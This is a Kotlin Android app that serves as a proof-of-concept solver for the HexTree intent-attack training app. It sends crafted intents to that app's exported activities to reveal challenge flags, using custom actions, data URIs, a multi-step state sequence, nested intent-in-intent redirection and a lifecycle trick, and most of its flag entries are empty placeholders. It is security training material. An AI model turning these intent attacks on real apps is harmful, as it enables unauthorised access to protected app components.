package com.example.hextreesolver

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.material3.Button
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Surface
import androidx.compose.material3.Switch
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Brush
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.hextreesolver.ui.theme.HexTreeSolverTheme

import android.content.Intent
import android.content.ComponentName
import androidx.compose.ui.platform.LocalContext
import android.net.Uri

// this is a POC app to hextree intent attacks apk

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            HexTreeSolverTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    MainContent(modifier = Modifier.padding(innerPadding))
                }
            }
        }
    }
}

@Composable
fun MainContent(modifier: Modifier = Modifier) {
    Column(modifier = modifier.fillMaxSize()) {
        HeaderSection()
        ButtonList()
    }
}

@Composable
fun HeaderSection() {
    Surface(
        modifier = Modifier.fillMaxWidth(),
        color = MaterialTheme.colorScheme.primaryContainer,
        shadowElevation = 8.dp
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(
                    brush = Brush.verticalGradient(
                        colors = listOf(
                            MaterialTheme.colorScheme.primaryContainer,
                            MaterialTheme.colorScheme.secondaryContainer
                        )
                    )
                )
                .padding(24.dp),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "This is Gohary's POC\nfor hextree app\n\nMake sure you have hextree app installed before trying",
                style = MaterialTheme.typography.headlineMedium.copy(
                    fontWeight = FontWeight.ExtraBold,
                    letterSpacing = 1.sp,
                    lineHeight = 28.sp
                ),
                color = MaterialTheme.colorScheme.onPrimaryContainer,
                textAlign = TextAlign.Center
            )
        }
    }
}

@Composable
fun FlagItem(id: Int, explanation: String, onButtonClick: () -> Unit) {
    var isToggled by remember { mutableStateOf(false) }
    
    Card(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        elevation = CardDefaults.cardElevation(defaultElevation = 2.dp),
        colors = CardDefaults.cardColors(
            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
        )
    ) {
        Column(
            modifier = Modifier
                .padding(16.dp)
                .fillMaxWidth(),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text(
                text = "Toggle to show flag $id Explanation",
                style = MaterialTheme.typography.labelMedium
            )
            Switch(
                checked = isToggled,
                onCheckedChange = { isToggled = it },
                modifier = Modifier.padding(vertical = 4.dp)
            )
            
            if (isToggled) {
                Text(
                    text = explanation,
                    style = MaterialTheme.typography.bodyLarge.copy(
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.primary
                    ),
                    modifier = Modifier.padding(vertical = 8.dp)
                )
            }
            
            Spacer(modifier = Modifier.height(4.dp))
            
            Button(
                onClick = onButtonClick,
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("flag$id")
            }
        }
    }
}

@Composable
fun ButtonList() {

    // Get the current Android context for launching the intent
    val context = LocalContext.current
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(16.dp),
        verticalArrangement = Arrangement.spacedBy(8.dp)
    ) {
        item {
            FlagItem( id = 1,
                explanation = "The Problem Here that the Activity is exported, any app can call it with an intent and launch it"
            ) {
                // === ACTION FOR FLAG 1 ===
                try {
                    val intent = Intent().apply {
                        // Explicitly target the vulnerable app package and activity class name
                        component = ComponentName(
                            "io.hextree.attacksurface", // Replace with actual HexTree package name if different
                            "io.hextree.attacksurface.activities.Flag1Activity" // Replace with actual vulnerable activity class
                        )

                    }
                    context.startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        item { FlagItem(2,
            "Same, Exported Activity, but this time it needed an action in the intent to reveal the flag") { /// === ACTION FOR FLAG 1 ===
            try {
                val intent = Intent().apply {
                    // Set the specific action string the target activity is checking for
                    action = "io.hextree.action.GIVE_FLAG"

                    component = ComponentName(
                        "io.hextree.attacksurface", // Replace with actual HexTree package name if different
                        "io.hextree.attacksurface.activities.Flag1Activity" // Replace with actual vulnerable activity class
                    )

                }
                context.startActivity(intent)
            } catch (e: Exception) {
                e.printStackTrace()
            } } }


        item { FlagItem(3,
            "Same, Exported Activity, but this time it needed an action and a data URI in the intent to reveal the flag") {
            try {
            val intent = Intent().apply {
                // Set the specific action string the target activity is checking for
                action = "io.hextree.action.GIVE_FLAG"
                // set the data URI as needed
                data = Uri.parse("https://app.hextree.io/map/android")

                component = ComponentName(
                    "io.hextree.attacksurface", // Replace with actual HexTree package name if different
                    "io.hextree.attacksurface.activities.Flag3Activity" // Replace with actual vulnerable activity class
                )

            }
            context.startActivity(intent)
        } catch (e: Exception) {
            e.printStackTrace()
        } } }

        item {
            // Track the current step of our exploit sequence locally in the UI
            var exploitStep by remember { mutableStateOf(1) }
            FlagItem(4,
                "State Machine Attack: Requires a 4-step sequence of specific intent actions without breaking the chain.\\n\\nNext Step to click: 4 times") {
            try {

                val intent = Intent().apply {
                    // Dynamically set the action based on our current exploit progress step
                    action = when (exploitStep) {
                        1 -> "PREPARE_ACTION"
                        2 -> "BUILD_ACTION"
                        3 -> "GET_FLAG_ACTION"
                        else -> "ANY_FINAL_ACTION" // Step 4 can be anything to trigger the final check
                    }

                    // Explicitly target the Flag4Activity class configuration
                    component = ComponentName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag4Activity"
                    )
                }

                // Launch the intent to transition the target app's state machine
                context.startActivity(intent)

                // Increment our step tracker, resetting back to 1 if we completed the sequence
                if (exploitStep < 4) {
                    exploitStep++
                } else {
                    exploitStep = 1
                }

            } catch (e: Exception) {
                e.printStackTrace()
            }

        } }
        item {
            FlagItem(
                id = 5,
                explanation = "Exported activity that needsIntent-in-Intent redirection: We must wrap a second intent inside the first nested intent to hit the 'success' condition."
            ) {
                // === ACTION FOR FLAG 5 ===
                try {
                    // 1. Deepest Nest (Intent 3): Needs extra "reason" set to "back"
                    val nestedIntent2 = Intent().apply {
                        putExtra("reason", "back")
                    }

                    // 2. Middle Nest (Intent 2): Needs extra "return" set to 42 AND holds Intent 3
                    val nestedIntent1 = Intent().apply {
                        putExtra("return", 42)
                        putExtra("nextIntent", nestedIntent2) // Nested parcelable intent
                    }

                    // 3. Outer Entry Intent: Targets Flag5Activity and delivers the entire nested payload
                    val outerIntent = Intent().apply {
                        component = ComponentName(
                            "io.hextree.attacksurface",
                            "io.hextree.attacksurface.activities.Flag5Activity"
                        )
                        putExtra("android.intent.extra.INTENT", nestedIntent1)
                    }

                    // Launch the attack package
                    context.startActivity(outerIntent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        item { FlagItem(6, "flag6 text") { /* Button 6 Action */ } }
        item {
            FlagItem(
                id = 7,
                explanation = "Activity Lifecycle Trick: Requires sending 'OPEN' to instantiate the activity via onCreate, followed immediately by 'REOPEN' to deliver a payload into onNewIntent."
            ) {
                // === ACTION FOR FLAG 7 ===
                try {
                    // 1. Create the initial instantiation intent
                    val openIntent = Intent().apply {
                        action = "OPEN"
                        component = ComponentName(
                            "io.hextree.attacksurface",
                            "io.hextree.attacksurface.activities.Flag7Activity"
                        )
                        // Adding the NEW_TASK flag ensures it initializes cleanly in the background/foreground stack
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    // 2. Create the follow-up re-entry intent
                    val reopenIntent = Intent().apply {
                        action = "REOPEN"
                        component = ComponentName(
                            "io.hextree.attacksurface",
                            "io.hextree.attacksurface.activities.Flag7Activity"
                        )
                        // SINGLE_TOP forces Android to reuse the existing instance instead of spinning up a fresh duplicate
                        addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
                    }

                    // Launch them sequentially
                    context.startActivity(openIntent)
                    context.startActivity(reopenIntent)

                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        item { FlagItem(8, "flag8 text") { /* Button 8 Action */ } }
        item { FlagItem(9, "flag9 text") { /* Button 9 Action */ } }
        item { FlagItem(10, "flag10 text") { /* Button 10 Action */ } }
        item { FlagItem(11, "flag11 text") { /* Button 11 Action */ } }
        item { FlagItem(12, "flag12 text") { /* Button 12 Action */ } }
        item { FlagItem(13, "flag13 text") { /* Button 13 Action */ } }
        item { FlagItem(14, "flag14 text") { /* Button 14 Action */ } }
        item { FlagItem(15, "flag15 text") { /* Button 15 Action */ } }
        item { FlagItem(16, "flag16 text") { /* Button 16 Action */ } }
        item { FlagItem(17, "flag17 text") { /* Button 17 Action */ } }
        item { FlagItem(18, "flag18 text") { /* Button 18 Action */ } }
        item { FlagItem(19, "flag19 text") { /* Button 19 Action */ } }
        item { FlagItem(20, "flag20 text") { /* Button 20 Action */ } }
        item { FlagItem(21, "flag21 text") { /* Button 21 Action */ } }
        item { FlagItem(22, "flag22 text") { /* Button 22 Action */ } }
        item { FlagItem(23, "flag23 text") { /* Button 23 Action */ } }
        item { FlagItem(24, "flag24 text") { /* Button 24 Action */ } }
        item { FlagItem(25, "flag25 text") { /* Button 25 Action */ } }
        item { FlagItem(26, "flag26 text") { /* Button 26 Action */ } }
        item { FlagItem(27, "flag27 text") { /* Button 27 Action */ } }
        item { FlagItem(28, "flag28 text") { /* Button 28 Action */ } }
        item { FlagItem(29, "flag29 text") { /* Button 29 Action */ } }
        item { FlagItem(30, "flag30 text") { /* Button 30 Action */ } }
        item { FlagItem(31, "flag31 text") { /* Button 31 Action */ } }
        item { FlagItem(32, "flag32 text") { /* Button 32 Action */ } }
        item { FlagItem(33, "flag33 text") { /* Button 33 Action */ } }
        item { FlagItem(34, "flag34 text") { /* Button 34 Action */ } }
        item { FlagItem(35, "flag35 text") { /* Button 35 Action */ } }
        item { FlagItem(36, "flag36 text") { /* Button 36 Action */ } }
        item { FlagItem(37, "flag37 text") { /* Button 37 Action */ } }
        item { FlagItem(38, "flag38 text") { /* Button 38 Action */ } }
        item { FlagItem(39, "flag39 text") { /* Button 39 Action */ } }
        item { FlagItem(40, "flag40 text") { /* Button 40 Action */ } }
        item { FlagItem(41, "flag41 text") { /* Button 41 Action */ } }
    }
}

@Preview(showBackground = true)
@Composable
fun MainContentPreview() {
    HexTreeSolverTheme {
        MainContent()
    }
}
